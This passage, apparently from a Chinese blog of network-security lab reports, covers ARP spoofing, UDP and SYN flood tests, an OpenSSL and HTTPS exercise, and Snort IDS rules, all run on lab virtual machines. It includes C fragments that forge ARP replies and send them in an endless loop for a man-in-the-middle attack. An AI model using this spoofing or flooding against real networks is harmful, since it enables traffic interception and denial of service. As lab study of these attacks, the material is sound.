<img data-src="/2019/09/28/experiments/security/web/arp/4baninternet.jpg" class="">
<p>在 WinArpAttacker 中，扫描到目标主机后，选择攻击 -&gt; 禁止上网，发现 Attack 处变为”BanGateway”，说明攻击过程已经开始。目标机的上网受到了一定的影响。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/4bannedinternet2.jpg" class="">
<h4 id="IP冲突">IP 冲突</h4>
<div class="note warning"><p>目标机 (A) 地址为 192.168.235.133 00-0C-29-E7-58-4D</p>
<p>操作系统 windows2000。</p>
</div> 
<p>扫描到需要攻击的主机后，选择攻击 -&gt; 定时 IP 冲突（不断 IP 冲突貌似也可以，只是一次发包量的不同，定时 IP 冲突可以方便看到过程），Attack 处变为 IPConflict，证明攻击过程开始。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/5ipconflict.jpg" class="">
<h4 id="中间人攻击">中间人攻击</h4>
<div class="note warning"><p>目标机 (A) 地址为 192.168.235.133 00-0C-29-E7-58-4D，操作系统 windows2000。</p>
<p>另外一个被监测机 (B) 地址为 192.168.235.134 00-0C-29-9D-2D-F7，操作系统为 Red Hat Linux Enterprise 7.2 64Bit。</p>
</div>
<p>顾名思义，中间人攻击需要有两台主机在互相通信（实验中用的是 ping）。所以布置好另外一台主机，先行测试互 ping 成功后，开启 WinArpAttacker，选择两台要监听的主机，选择攻击 -&gt; 监听主机通讯。Attack 处会变为 SniffHosts。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/6sniffering.jpg" class="">
<p>然后让两个虚拟机之间互相 ping。与此同时打开 wireshark 准备进行抓包分析。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/6snifferatob.jpg" class=""> <img data-src="/2019/09/28/experiments/security/web/arp/6snifferbtoa.jpg" class="">
<h3 id="编程进行ARP攻击">编程进行 ARP 攻击</h3>
<p>本机安装 winpcap 及其开发包环境，编程运行截图如下：</p>
<img data-src="/2019/09/28/experiments/security/web/arp/7pcap1.jpg" class="">
<img data-src="/2019/09/28/experiments/security/web/arp/7pcap2.jpg" class="" width="200" height="200">
<h2 id="实验结果及分析">实验结果及分析</h2>
<h3 id="查看本机-A-的ARP缓存表">查看本机 (A) 的 ARP 缓存表</h3>
<img data-src="/2019/09/28/experiments/security/web/arp/2beforesend.jpg" class="">
<p>第一行的 IP 地址恰好是监测机的 IP 之一，MAC 地址也是监测机的硬件地址。类型为动态。此检测结果也表明其与监测机在同一网段下 (192.168.235.*)。</p>
<h3 id="禁止上网-2">禁止上网</h3>
<img data-src="/2019/09/28/experiments/security/web/arp/4bannedinternet1.jpg" class="">
<p>当执行禁止上网攻击后，靶机的 arp 记录中多了一条 <code>0.0.0.0-&gt;01-01-01-01-01-01</code> 的动态路由。经查阅资料可得知，在这里，0.0.0.0 表示 “本网络的本主机”，也表示默认的路由，即所有不满足路由表其他 IP 要求的路由均由该地址进行处理。本主机的 MAC 地址被指定了一个非法的值（01-01-01-01-01-01），理论上会导致发往本机的所有包均丢失。经观察抓包记录，发现监测机不断在向外部广播请求 <code>192.168.235.2</code> 的地址，然而一直得不到回复。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/4bannedinternet3.jpg" class=""> <img data-src="/2019/09/28/experiments/security/web/arp/4bannedinternet4.jpg" class="">
<div class="note warning"><p>但是，本次测试的这个攻击的强度并没有想象中的大，在虚拟机中也不是所有的网都上不了，可以访问百度主页，只是访问不了贴吧子域名。可能是这部分的缓存完好无损，恰好不需要 0.0.0.0 来默认路由的原因。</p>
</div>
<h3 id="IP冲突-2">IP 冲突</h3>
<img data-src="/2019/09/28/experiments/security/web/arp/5ipconflict3.jpg" class="">
<p>查看 arp 列表并没有异常的地方。检查 attacker 软件的日志，发现了在 IP 冲突攻击前，目的机的 MAC 地址被改成了 01-01-01-01-01-01。本地由于开了保护所以又将 MAC 地址改为了目的机的源 MAC 地址。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/5ipconflict4.jpg" class=""> 
<p>检查抓包记录，发现目标机发送了一次 GARP 请求，从 192.168.235.133 发到了 192.168.235.133，这个请求通常用于确认有没有其他主机的 IP 与它相同。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/5ipconflict5.jpg" class="">
<div class="note danger"><p>感觉不太对，为什么这个截图和禁止上网的那么像，有 GARP 请求但没有 IP Conflict 错误…… 是不是抓包时用错网卡了？</p>
</div>
<p>目的机在 IP 冲突开始的一瞬间报了一个错误。除此以外没有别的影响。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/5ipconflict2.jpg" class="">
<h3 id="中间人攻击-2">中间人攻击</h3>
<p>在靶机开心的互 ping 时，看到 attacker 软件上的日志有了这样两个事件。其中一个是修改目的 IP，监测机 192.168.235.1 在两个主机 192.168.235.133 和 192.168.235.134 间担任了转发者的角色，两个主机并不知道它们通信时 192.168.235.1 在做它们的 “网关”。第二个是修改 MAC 映射，把两个主机的对方 IP 对应的 MAC 地址改成监测机自己的 MAC 网关，这样就实现了对两个机子通信的监听。</p>
<img data-src="/2019/09/28/experiments/security/web/arp/6sniffering2.jpg" class="">
<img data-src="/2019/09/28/experiments/security/web/arp/6sniffering3.jpg" class="">
<p>对两个机子的抓包结果看不到任何监听的痕迹。从两个目标机的角度来看，它们发现不了被监听的痕迹，也没有相关的第三方流量。</p>

<img data-src="/2019/09/28/experiments/security/web/arp/6sniffera.jpg" class="">
<h3 id="Winpcap-编程攻击">Winpcap 编程攻击</h3>
<img data-src="/2019/09/28/experiments/security/web/arp/7pcap4.jpg" class="">
<p>攻击效果如上图，可以看到，成功地实现了 MAC 和 IP 地址的碰撞，它们全部碰撞在同一网关地址 00-50-56-c0-00-08 上，造成了冲突。编程的关键在于 ARP 包的构建，由于 winpcap 提供了发包的 api <code>int pcap_sendpacket(pcap_t *, const u_char *, int)</code>，我们剩下的工作就是构建正确的协议头。</p>
<ul>
<li>
<p>根据 ARP 协议包的构成，我们有</p>
  <figure class="highlight c"><figcaption><span>arp_header.h</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">pkt-&gt;eth_hdr.type = htons(<span class="number">0x0806</span>);</span><br><span class="line">pkt-&gt;arp_hdr.hardware_type = htons(<span class="number">0x1</span>);</span><br><span class="line">pkt-&gt;arp_hdr.protocol_type = htons(<span class="number">0x800</span>);</span><br><span class="line">pkt-&gt;arp_hdr.hardware_len = <span class="number">6</span>;</span><br><span class="line">pkt-&gt;arp_hdr.protocol_len = <span class="number">4</span>;</span><br><span class="line">pkt-&gt;arp_hdr.option = htons(<span class="number">0x2</span>);</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>
<p><code>0x0806</code> 代表该帧封装了 arp 包，硬件类型为以太网 <code>0x1</code>，协议类型为 IP<code>0x0800</code>，硬件地址为 MAC 地址，其长度为 6，协议地址为 IP 地址，其长度为 4，此包封装了 ARP 应答，值为 <code>0x2</code>。<br>
然后，在这里，构造 packet 的目标 IP 和 MAC 地址。</p>
  <figure class="highlight c"><figcaption><span>arp.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag == TO_VICTIM_HOST) {</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAC_LEN; i++)</span><br><span class="line">		pkt-&gt;eth_hdr.dst_mac[i] = pkt-&gt;arp_hdr.dst_mac[i] =  VICTIM_MAC[i];</span><br><span class="line">	pkt-&gt;arp_hdr.src_ip = inet_addr(GATEWAY_IP);</span><br><span class="line">	pkt-&gt;arp_hdr.dst_ip = inet_addr(VICTIM_IP);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (flag == TO_VICTIM_GATEWAY) {</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAC_LEN; i++)</span><br><span class="line">		pkt-&gt;eth_hdr.dst_mac[i] = pkt-&gt;arp_hdr.dst_mac[i] = GATEWAY_MAC[i];</span><br><span class="line">	pkt-&gt;arp_hdr.src_ip = inet_addr(VICTIM_IP);</span><br><span class="line">	pkt-&gt;arp_hdr.dst_ip = inet_addr(GATEWAY_IP);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>最后在一个循环中，不断发出 arp 请求包。</p>
  <figure class="highlight c"><figcaption><span>arp.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Press ctrl+C to stop attack...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(attack_host){</span><br><span class="line">		<span class="keyword">if</span> (pcap_sendpacket(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt_host, <span class="keyword">sizeof</span>(ARP_PKT)) != <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nError sending the packet: \n"</span>, pcap_geterr(handle));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"attack %s...\n"</span>, VICTIM_IP);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span>(attack_gateway){</span><br><span class="line">		<span class="keyword">if</span> (pcap_sendpacket(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt_gateway, <span class="keyword">sizeof</span>(ARP_PKT)) != <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nError sending the packet: \n"</span>, pcap_geterr(handle));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"attack %s...\n"</span>, GATEWAY_IP);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
</ul>
</li>
</ul>
<p>前述截图中输出了 attack xxx，说明 ARP 包被成功发送。</p>
<h2 id="总结">总结</h2>
<h3 id="软件使用方面">软件使用方面</h3>
<ol>
<li>WinArpAttacker 的兼容性在 win10 中略差，启动前需要先行调整为兼容模式，以防止闪退。</li>
<li>WinArpAttacker 扫描主机时，要注意选择虚拟机所在的 VMware 网卡，否则扫描不到虚拟机，同时要注意仔细核对目标 ip 和 mac 地址，防止其对正常影响的监测机产生影响，误伤到自己或其他无辜的局域网用户。</li>
</ol>
<h3 id="ARP知识方面">ARP 知识方面</h3>
<p>掌握了 ARP 网络包的组成和构建，并尝试在结构体的帮助下，使用 C 语言编程实现 ARP 请求包的发送。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
        <category>漏洞</category>
        <category>协议漏洞</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DoS 拒绝服务攻击</title>
    <url>/2019/10/26/experiments/security/web/dos/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>掌握 DoS 攻击的基本原理和应用，分析一次工具发出的 UDP Flood 攻击。尝试使用 WindowsXP 编程实现 SYN Flood 攻击。</p>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="原理">原理</h2>
<ul>
<li>DoS 攻击，又叫做拒绝服务攻击，是能导致合法用户不能正常访问网络服务的行为。其升级版本为 DDoS（分布式拒绝服务攻击）。DoS 攻击分为很多种，本次实验用到的是 SYN Flood。</li>
<li>正常 TCP 请求需要经过三次握手过程，请求端（A）发送包含 SYN 标识的 TCP 报文，请求与服务端建立连接→服务端（B）返回一个 SYN+ACK 报文，表示接受客户端连接请求→客户端（A）返回确认报文 ACK，双方确认连接建立。若请求端发送 SYN 包后，随即掉线，服务端会不停重试，再次尝试向 A 机发送 SYN+ACK 报文，等待一段时间后，丢弃连接，大量半开连接会消耗很多系统资源。</li>
<li>SYN Flood 攻击通过虚假的数据包，造成目标保存大量半开 TCP 连接，消耗很多系统资源，正常的请求不能得到响应，造成拒绝服务攻击。</li>
</ul>
<h2 id="步骤和关键技术">步骤和关键技术</h2>
<div class="note info"><p>所有实验的监测机均为运行着 win10 机器，ip 地址为 192.168.235.1，其运行着 wireshark</p>
</div>
<h3 id="攻击工具进行的UDP-flood攻击">攻击工具进行的 UDP flood 攻击</h3>
<p>本部分实验中，攻击机为运行 winxp 的机器，ip 地址为 192.168.235.136。 被攻击机为运行 win2000 的机器，ip 地址为 192.168.235.133。 首先确立目标，在被攻击机上运行 <code>netstat -an</code>，在打开的 udp 端口列表中，选择 137 端口为目标。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/1.png" class="">
<p>在攻击机上打开 udp flooder 软件，指定 ip 和 port，发送信息随便写一些内容，长度设为 30 秒，点击 Go 开始攻击，此过程中同时开启主机的 wireshark 软件开始抓包。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/2.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/3.png" class="">
<div class="note info"><p>速度并没有设的很快。</p>
</div>
<h3 id="自己编程实现SYN-flood攻击">自己编程实现 SYN flood 攻击</h3>
<div class="note info"><p>本次实验中，我选择了基于 socket 的实现。编程环境为 winxp，测试环境为 win2000。攻击机为运行 win2000 的机器，ip 地址为 192.168.235.141。被攻击机为运行 win2000 的机器，ip 地址为 192.168.235.133，开启了 21 号端口（ftp 服务）。源码见附件</p>
</div>
<h2 id="数据和分析">数据和分析</h2>
<h3 id="分析攻击工具进行的UDP-Flood攻击">分析攻击工具进行的 UDP Flood 攻击</h3>
<img data-src="/2019/10/26/experiments/security/web/dos/4.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/5.png" class="">
<p>被攻击机把这个工具传输的数据包解析为 NBNS 协议。在攻击包中可以看到自己传输进去的信息，包的状态是被分割的且包是错误的形成的。可以看到，UDP Flood 主要是向目标机传送大量垃圾的错误协议包，从而打乱目标机的正常通信。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/6.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/7.png" class="">
<h3 id="分析自己编程实现的SYN-Flood攻击">分析自己编程实现的 SYN Flood 攻击</h3>
<p>在目标机上开启 FTP 服务。确认 21 号 tcp 端口开启。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/8.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/9.png" class="">
<p>在攻击机上运行攻击程序，发现目标机的 cpu 使用率飙升至满值，操作上也变得很卡。本来很顺畅的 ping 过程也受到了影响，开始存在掉包现象。关掉攻击后，系统 cpu 回复正常，网络回复正常。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/10.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/11.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/12.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/13.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/14.png" class="">
<p>观察 ftp 服务器的日志，可以看到有大量伪造 ip 源同本服务器建立了连接。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/15.png" class="">
<p>下面分析 wireshark 抓包情况，可以看到，攻击机使用假地址 <code>10.168.150.*</code> 向目标机发送了大量 SYN 请求，每次都使用不同的端口。[后来源码改成了 <code>128.1.*.*</code>，本质不影响]</p>
<img data-src="/2019/10/26/experiments/security/web/dos/16.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/17.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/18.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/19.png" class="">
<p>其中一个包体如截图所示，这个包体的 SYN 标志位被置为 1。说明 270 号端口欲与服务器的 21 号端口建立连接。</p>
<p>观察整个发包过程，发现一开始服务器还可以响应一些连接。RST 连接数目较少。后来（可能也触发了一些保护机制：发送窗口被设为 0 了），服务器开始重置连接，不停回应 RST+ACK（而不是 SYN flood 的现象 SYN+ACK）。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/20.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/21.png" class="">
<p>很不容易发回了一个 SYN+ACK 包，还被自己 RST 掉了。</p>
<img data-src="/2019/10/26/experiments/security/web/dos/22.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/23.png" class="">
<p>SYN+ACK 包就是一个普通的三步握手中第二步的过程。</p>
<p>后来发现，编程时随机端口范围指定太大了，导致服务器忙于 RST 其他的端口而不发动重试。将端口范围调整至 80~90 后，出现了重试包。但这不是服务端的…… 本来就不存在的 “伪造 IP” 端自己发动了一次重试？看来应该不是端口范围的问题……</p>
<img data-src="/2019/10/26/experiments/security/web/dos/24.png" class="">
<img data-src="/2019/10/26/experiments/security/web/dos/25.png" class="">
<p>我个人也没有想到是编程源码的问题还是服务端 / 客户端防火墙设置问题……</p>
<p>由于这个问题没能解决，也无法复现出服务端向客户端发送 SYN+ACK 包没有得到回应后，再次发动重试，从而建立了一个 “半连接” 的现象。因此，也无从再进一步分析。</p>
<h2 id="收获">收获</h2>
<p>了解了一些常见的拒绝服务攻击原理，使用 wireshark 分析其中的两种拒绝服务攻击，进一步理解 DoS 攻击。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
        <category>漏洞</category>
        <category>DoS</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS 与 SSL 实验</title>
    <url>/2019/12/10/experiments/security/web/https-ssl/</url>
    <content><![CDATA[<div class="note warning"><p>本篇文章未整理成正式实验记录，故可能出现书写或表述不完整的情况。</p>
</div>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="OpenSSL编译及代码书写">OpenSSL 编译及代码书写</h2>
<p>有点小坑，需要使用安装版 vc6.0，且需要在生成 do_ms 后将 ntdll.mak 中 CFlags 中的 <code>/WX</code> 选项去掉。运行 <code>nmake -f ms/ntdll.mak</code> 生成的是动态库。</p>
<div class="note info"><p>不需要 ipv6 库，所以在 configure 时要指定 <code>-DOPENSSL_USE_IPV6=0</code></p>
</div>
<img data-src="/2019/12/10/experiments/security/web/https-ssl/2.png" class="" title="Configure命令">
<img data-src="/2019/12/10/experiments/security/web/https-ssl/1.png" class="" title="perl 版本">
<img data-src="/2019/12/10/experiments/security/web/https-ssl/11.png" class="" title="测试成功">
<p>为方便使用，将 bin 的路径加入系统变量 path 中。这样可以在命令行中方便地启动 <code>openssl</code></p>
<img data-src="/2019/12/10/experiments/security/web/https-ssl/12.png" class="" title="加入path">
<img data-src="/2019/12/10/experiments/security/web/https-ssl/13.png" class="" title="命令行启动openssl工具">
<h3 id="配置OpenSSL测试环境">配置 OpenSSL 测试环境</h3>
<ol>
<li>
<p>在 <code>openssl\openssl.cnf</code> 下设置证书缺省字段</p>
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/14.png" class="" title="默认签名用信息">
</li>
<li>
<p>生成客户端和服务端的证书请求文件和私钥</p>
 <figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:1024 -out req1.pem -keyout sslclientkey.pem openssl req -newkey rsa:1024 -out req2.pem -keyout sslserverkey.pem</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/15.png" class="" title="签署新的CA">
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/16.png" class="" title="证书信息">
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/17.png" class="" title="生成私钥"> 
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/18.png" class="" title="生成私钥2">
</li>
<li>
<p>执行命令，签发客户端和服务端证书。</p>
 <figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">openssl ca -in req1.pem -out sslclientcert.pem openssl ca -in req2.pem -out sslservercert.pem</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/19.png" class="" title="签发证书1">
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/20.png" class="" title="签发证书2">
</li>
<li>
<p>执行命令，运行 ssl 服务端和客户端</p>
 <figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">openssl s_server -cert sslservercert.pem -key sslserverkey.pem -CAfile demoCA/cacert.pem -ssl3 openssl s_client -ssl3 -CAfile demoCA/cacert.pem</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/23.png" class=""> 
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/24-1.png" class=""> 
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/24-2.png" class="">
</li>
</ol>
<h3 id="OpenSSL编程">OpenSSL 编程</h3>
<ol>
<li>源代码 <script src="//gist.github.com/c6e99430d8f6d7f3ee82b971590ff9c0.js?file=sha1.cpp"></script></li>
<li>与标准 CRC SHA 工具的运算结果比较，完全相同，说明算法正确。 <div class="tabs" id="opensslcode"><ul class="nav-tabs"><li class="tab active"><a href="#opensslcode-1">代码运行</a></li><li class="tab"><a href="#opensslcode-2">标准工具</a></li></ul><div class="tab-content"><div class="tab-pane active" id="opensslcode-1"><img data-src="/2019/12/10/experiments/security/web/https-ssl/21.png" class=""></div><div class="tab-pane" id="opensslcode-2"><img data-src="/2019/12/10/experiments/security/web/https-ssl/22.png" class=""></div></div></div></li>
</ol>
<h2 id="HTTPS网站抓包及过程简析">HTTPS 网站抓包及过程简析</h2>
<div class="note default"><p>为了好截图以呈现结果，找了一个内容比较少的小站 <a href="https://www.fantasyroom.cn">https://www.fantasyroom.cn</a> (也是我的小站咯～)<br>
<img data-src="/2019/12/10/experiments/security/web/https-ssl/3.png" class="" title="浏览器上的小锁图标也可意味着其受到SSL的保护"><br>
IP 地址为 49.235.250.44（现在已更换，所以不作打码处理咯～）</p>
</div>
<ol>
<li>可以看到几个 TLSv1.2 标志的包 <img data-src="/2019/12/10/experiments/security/web/https-ssl/4.png" class="">
</li>
<li>首先，客户端发送 client hello，协商密钥参数等信息 <img data-src="/2019/12/10/experiments/security/web/https-ssl/5.png" class="">
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/6.png" class="">
</li>
<li>服务器端发回 server hello，这个 server hello 包含认证信息和服务端的密钥交换。这次交换用到了椭圆曲线 DH 协议。 <img data-src="/2019/12/10/experiments/security/web/https-ssl/7.png" class="">
</li>
<li>客户端的密钥交换。握手消息此时已经处于加密状态。 <img data-src="/2019/12/10/experiments/security/web/https-ssl/8.png" class="">
</li>
<li>双方以加密方式互相通信应用数据。需要新的 session 时，由 server 端发起 change cipher spec 请求。 <img data-src="/2019/12/10/experiments/security/web/https-ssl/9.png" class=""> 
 <img data-src="/2019/12/10/experiments/security/web/https-ssl/10.png" class="">
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>入侵检测</title>
    <url>/2019/11/25/experiments/security/web/ids/</url>
    <content><![CDATA[<h2 id="目的">目的</h2>
<p>了解入侵检测的基本原理，尝试在 Windows XP 下配置 Snort IDS 并完成基于 Snort 的攻击检测。尝试利用 Snort 规则语法自己编写简单的 Snort 规则。</p>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="原理">原理</h2>
<h3 id="入侵检测定义">入侵检测定义</h3>
<p>入侵检测是防火墙的合理补充，帮助系统对付网络攻击，扩展了系统管理员的安全管理能力 (包括安全审计、监视、进攻识别和响应)，提高了信息安全基础结构的完整性。它从计算机网络系统中的若干关键点收集信息，并分析这些信息，看看网络中是否有违反安全策略的行为和遭到袭击的迹象。入侵检测被认为是防火墙之后的第二道安全闸门，在不影响网络性能的情况下能对网络进行监测，从而提供对内部攻击、外部攻击和误操作的实时保护。</p>
<h3 id="Snort软件">Snort 软件</h3>
<p><a href="https://www.snort.org/">Snort</a> 是由 Sourcefire 开发的一个开源的网络入侵检测系统。用 C 语言编写的开放源代码软件。它是一个跨平台、轻量级的网络入侵检测软件。它结合了协议、特征和基于异常的检测，是目前使用最多的 IDS/IPS 系统。</p>
<p>一条 snort 规则包括包含规则头和规则选项两部分；snort 规则如下：</p>
<ol>
<li>Snort 规则应写在一行，若需多行，应用 <code>\</code> 来拆分。</li>
<li>规则头包含规则的动作，协议，源和目标的 IP 地址和端口信息</li>
<li>规则选项部分包含细节、具体的描述和约定。</li>
</ol>
<h2 id="实验过程">实验过程</h2>
<h3 id="配置Snort环境">配置 Snort 环境</h3>
<p>首先装好 Snort 软件。用 <code>snort -W</code> 命令测试安装正确性</p>
<img data-src="/2019/11/25/experiments/security/web/ids/0.png" class="" width="200" height="200">
<img data-src="/2019/11/25/experiments/security/web/ids/1.png" class="" width="200" height="200" title="界面上显示了“小猪嘴”和版本号，即宣告安装成功">
<ul>
<li>
<p>运行 <code>snort -i 1</code> 可以进入嗅探模式，显示如下</p>
  <img data-src="/2019/11/25/experiments/security/web/ids/2.png" class="" width="250" height="250">
</li>
<li>
<p>运行 <code>snort -de -1</code> 进入的是数据包记录器模式。我把日志记录在了 C 盘的 Snort/log 文件夹下，此文件可以用 Wireshark 打开。</p>
  <img data-src="/2019/11/25/experiments/security/web/ids/3.png" class=""> <img data-src="/2019/11/25/experiments/security/web/ids/4.png" class="">
</li>
<li>
<p>根据实验指导书做一些配置修改后，用以下命令启动攻击检测模式。</p>
  <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">snort -c <span class="string">"path/to/snort.conf"</span> -l <span class="string">"path/to/logdir"</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>此时开始了攻击检测模式，可以到 <code>C:/Snort/log</code> 下查看告警日志。 <img data-src="/2019/11/25/experiments/security/web/ids/6.png" class="" width="200" height="200"> <img data-src="/2019/11/25/experiments/security/web/ids/7.png" class="" width="200" height="200"></li>
<li>不过里面没有 UDP 包告警的相关的信息…… 是因为默认的社区规则里面并没有针对这个情况进行专门配置 <img data-src="/2019/11/25/experiments/security/web/ids/8.png" class="" width="200" height="200"></li>
</ul>
</li>
</ul>
<h3 id="添加UDP规则">添加 UDP 规则</h3>
<ol>
<li>
<p>在本地添加一条 UDP 规则</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">alert udp any any &lt;&gt;$HOME_NET any (msg:”udp ids/dns-version-query”;content:”version”;)</span><br></pre></td></tr></tbody></table></figure>
 <div class="note info"><h4 id="含义">含义</h4>
<p>这条规则的含义是：对一条 UDP 规则生成一条警报并记录这个包，此规则针对任意 UDP 协议的非本地任何地址任何端口双方向（HOME_NET 在 snort.conf 中有配置，应该配置为本机的地址），发送一条信息，内容为”udp ids/dns-version-query”，包含”version” 字符即匹配</p>
</div>
 <img data-src="/2019/11/25/experiments/security/web/ids/9.png" class="">
</li>
<li>
<p>由上图得知，我的电脑的 <code>HOME_NET</code> 值应该为 192.168.235.136。将规则加入 local.rules 中，注释掉其他的 rules，只运行自己写的 rules。</p>
 <img data-src="/2019/11/25/experiments/security/web/ids/10.png" class="">
 <div class="note warning"><p>最终规则语句调整为 <code>alert udp any any &lt;&gt; $HOME_NET any (sid:xxxx;msg:"udp ids/dns-version-query";content:"version";)</code>，<code>&lt;&gt;</code> 两侧必须有空格，每条规则必须有一个 sid 值，msg 必须包含在英文引号中。</p>
</div>
</li>
<li>
<p>在另一台虚拟机上运行 UDP Flood 工具，对 135 端口进行扫描攻击。注意所发的信息要包含<code>”version”</code> 字符串，才会有报警（否则不会匹配规则）。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/11.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/12.png" class=""></div></div></div>
<ul>
<li>alert.ids 和同期所记录 log 用 wireshark 打开的结果如上图所示。</li>
</ul>
</li>
</ol>
<h2 id="实验结果及分析">实验结果及分析</h2>
<h3 id="自己编写Snort规则：mytelnet-rules">自己编写 Snort 规则：<code>mytelnet.rules</code></h3>
<div class="note info"><p>要求：记录外网对内网的 Telnet 连接企图，并发出下面的警告：External net attempt to access internal telnet server。</p>
</div>
<ul>
<li>
<p>根据 snort 规则的相关编写知识，得到相应的 snort 规则应该为：</p>
  <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">alert tcp !$HOME_NET any -&gt; $HOME_NET 23 (msg:"External net attempt to access internal telnet server";sid:xxxx;)</span><br></pre></td></tr></tbody></table></figure>
  <img data-src="/2019/11/25/experiments/security/web/ids/13.png" class="" width="200" height="200">
</li>
<li>
<p>装入 local.rules 进行测试，然后用外网 telnet snort 所在的虚拟机地址。测试结果如下：（测试机需要事先开启 telnet 服务）</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/14.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/15.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/16.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/25/experiments/security/web/ids/17.png" class=""></div></div></div>
<p>果然在 <code>alert.ids</code> 中有相应记录</p>
</li>
</ul>
<h3 id="利用Snort检测网络扫描攻击">利用 Snort 检测网络扫描攻击</h3>
<p>为使 snort 具备端口扫描检测的能力，需要启用端口扫描检测插件，在 snort 中，这类插件通常通过预处理器的方式提供。</p>
<ul>
<li>
<p>在 <code>snort.conf</code> 中，找到 <code>sfportscan</code> 预处理器，把注释去掉以开启这个预处理器。 <img data-src="/2019/11/25/experiments/security/web/ids/18.png" class=""></p>
